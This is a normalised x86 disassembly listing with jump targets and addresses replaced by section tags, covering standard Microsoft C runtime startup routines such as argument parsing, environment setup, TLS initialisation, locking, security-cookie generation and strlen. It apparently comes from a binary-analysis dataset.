je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_4061a0
pop ecx
test eax eax
je r-xdata
call sub_4061a0
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_404baf
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_40687e
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_404a15
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_406935
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_404a15
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_404c6a
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_406935
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_40689c
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_404d01
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_40697a
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
mov eax [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
or [ eax - 0x5 ] 0xffffffff
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x3 ] ecx
mov [ eax + 0x1f ] 0xa00
mov [ eax + 0x21 ] 0xa
mov [ eax + 0x33 ] ecx
mov [ eax + 0x2f ] cl
mov esi [ rw-data ]
add eax 0x40
lea edx [ eax - 0x5 ]
add esi 0x800
cmp edx esi
jb r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp eax 0xfffffffe
je r-xdata
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x4 ] eax
add eax ebx
mov esi 0x800
mov [ ebp - 0x8 ] eax
cmp ebx esi
jl r-xdata
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
or [ esi + 0x4 ] 0x80
jmp r-xdata
cmp [ rw-data ] ebx
jge r-xdata
mov ebx esi
or [ esi + 0x4 ] 0x40
mov [ esi ] 0xfffffffe
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
cmp ebx 0x3
jl r-xdata
xor edi edi
test ebx ebx
jle r-xdata
mov edi rw-data
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0xffffffff
je r-xdata
mov ebx [ rw-data ]
add [ rw-data ] 0x20
lea ecx [ eax + 0x800 ]
mov [ edi ] eax
cmp eax ecx
jae r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
add [ ebp - 0x8 ] 0x4
inc edi
inc [ ebp - 0x4 ]
cmp edi ebx
jl r-xdata
cmp eax 0xfffffffe
je r-xdata
add edi 0x4
cmp [ rw-data ] ebx
jl r-xdata
add eax 0x5
cmp eax 0x3
jne r-xdata
or [ esi + 0x4 ] 0x40
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
test cl 0x1
je r-xdata
push 0x40
push 0x20
call sub_40697a
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
or [ eax - 0x5 ] 0xffffffff
and [ eax + 0x3 ] 0x0
and [ eax + 0x1f ] 0x80
and [ eax + 0x33 ] 0x0
mov [ eax - 0x1 ] 0xa00
mov [ eax + 0x20 ] 0xa0a
mov [ eax + 0x2f ] 0x0
mov ecx [ edi ]
add eax 0x40
add ecx esi
lea edx [ eax - 0x5 ]
cmp edx ecx
jb r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ esi + 0x4 ] 0x8
test cl 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
inc [ esi + 0x8 ]
jmp r-xdata
mov esi edi
and esi 0x1f
mov eax edi
sar eax 0x5
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
pop edi
pop ebx
inc [ esi + 0x8 ]
sub_404f46
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_404f6c
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_404fa4
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_404fd8
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_4055c0
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_405015
push 0x8
push r--data
call sub_405430
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4050b7
push 0xc
call sub_4056f0
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_406a14
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4050c0
call sub_405475
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_4050c9
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_404fa4
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_40697a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_40689c
pop ecx
xor esi esi
push 0x0
push esi
call sub_405015
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_40515c
push 0x8
push r--data
call sub_405430
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_405475
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_40689c
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_40689c
pop ecx
push 0xd
call sub_4056f0
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_40689c
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405276
push 0xc
call sub_4056f0
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405282
push esi
call sub_40689c
pop ecx
push edi
call sub_406aa3
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_40689c
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_406b3c
pop ecx
sub_40528b
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_404fd8
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_404f9b
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4042ec
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_405576
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_404fd8
mov edi [ DecodePointer@IAT ]
push sub_40515c
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_40697a
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_405015
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_405430
push sub_403960
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_405489
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
or eax 0x4711
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_405576
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_4055c0
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_40689c
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_40562e
push 0xc
push r--data
call sub_405430
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_404757
push 0x1e
call sub_4045a8
push 0xff
call sub_4042c2
push 0x18
call sub_406935
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4056f0
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_405b59
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_405475
retn
push edi
call sub_40689c
pop ecx
push 0xfa0
push edi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_40689c
pop ecx
call sub_405b59
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4056e7
mov eax [ ebp - 0x1c ]
sub_4056f0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_40562e
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_404564
sub_405741
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_405785
push 0x20
push r--data
call sub_405430
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_4050c9
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_405475
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_405741
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_404530
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_405b59
mov [ eax ] 0x16
call sub_405ad0
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4056f0
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_404f92
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4058ec
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_405955
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_403840
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_405524
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_40382c
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_405524
pop ecx
sub_405a7e
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_405955
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_405aa3
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405a7e
int3
pop ebp
jmp eax
sub_405aef
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_405b17
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405b6c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_407101
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4069c6
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_4069c6
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_405c22
mov edi edi
push esi
push 0x4
push 0x20
call sub_40697a
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_405c53
push 0xc
push r--data
call sub_405430
call sub_4042da
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_405b6c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405c89
mov eax [ ebp - 0x1c ]
call sub_405475
retn
sub_405ca6
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_405cd0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
